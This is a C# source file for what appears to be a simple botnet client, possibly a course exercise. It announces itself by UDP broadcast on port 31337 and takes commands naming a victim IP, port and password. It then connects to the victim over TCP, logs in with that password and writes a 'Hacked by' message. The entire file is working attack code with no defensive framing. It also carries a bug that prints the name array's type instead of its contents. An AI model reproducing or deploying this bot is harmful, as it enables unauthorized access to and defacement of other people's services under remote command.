using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Bot
{
    class Program
    {
        public UdpClient udpClient { get; set; }
        public TcpClient tcpClient { get; set; }
        public UInt16 port = 0;

        public Program()
        {
            udpClient = new UdpClient(0);
        }
        public TcpClient CreateTcpClient()
        {
            return tcpClient;
        }

        public UdpClient CreateUdpClient()
        {
           
            port = UInt16.Parse(((IPEndPoint)udpClient.Client.LocalEndPoint).Port.ToString());
            Console.WriteLine("Bot is listening on port " + ((IPEndPoint)udpClient.Client.LocalEndPoint).Port); 
            IPEndPoint test = new IPEndPoint(IPAddress.Parse("255.255.255.255"), 31337);
            try
            {
                while (true)
                {
                    Byte[] portBytes = BitConverter.GetBytes(port);
                    Byte[] sendBytes = new byte[2];

                    sendBytes[0] = portBytes[0];
                    sendBytes[1] = portBytes[1];
                    //send bot announcement
                    udpClient.Send(sendBytes, sendBytes.Length,test);
                    Thread.Sleep(10000);
                }

            }
            catch
            {
                Console.WriteLine("Bot: error udp client"); 
            }

            return udpClient;
        }

        public void getFromServer()
        {

            try
            {
                IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 31337);

                while (true)
                {
                    var data = udpClient.Receive(ref ipep);
                    byte[] ip = new byte[4];
                    byte[] pass = new byte[6];
                    byte[] name = new byte[32];
                    Array.Copy(data, 0, ip, 0, ip.Length); //ip
                                                           
                    UInt16 port = BitConverter.ToUInt16(new byte[] { data[4], data[5] }, 0);
                    Array.Copy(data, 6, pass, 0, pass.Length); //password
                    Array.Copy(data, 12, name, 0, name.Length);//name
                    IPAddress ipp = new IPAddress(ip);

                    tcpClient = new TcpClient();
                    tcpClient.Connect(ipp, port);
                    NetworkStream netStream = tcpClient.GetStream();
                    byte[] allmsg = new byte[tcpClient.ReceiveBufferSize];

                    int size = netStream.Read(allmsg, 0, tcpClient.ReceiveBufferSize);
                    String toVictim = Encoding.ASCII.GetString(allmsg, 0, size);

                    netStream.Write(pass, 0, pass.Length);

                    int size2 = netStream.Read(allmsg, 0, tcpClient.ReceiveBufferSize);
                    String toVictim2 = Encoding.ASCII.GetString(allmsg, 0, size2);

                    byte[] hackedMessege = Encoding.ASCII.GetBytes("Hacked by " + name + "\r\n");
                    netStream.Write(hackedMessege, 0, hackedMessege.Length);


                }
            }
            catch
            {

            }
        
            
        }


        static void Main(string[] args)
        {
            try
            {
                Program b = new Program();
                Thread t1 = new Thread(() => b.CreateUdpClient());
                Thread t2 = new Thread(() => b.getFromServer());
                t1.Start();
                t2.Start();


            }
            catch (Exception e)
            {
                Console.WriteLine("errorrrr");
            }
        }
    }
}
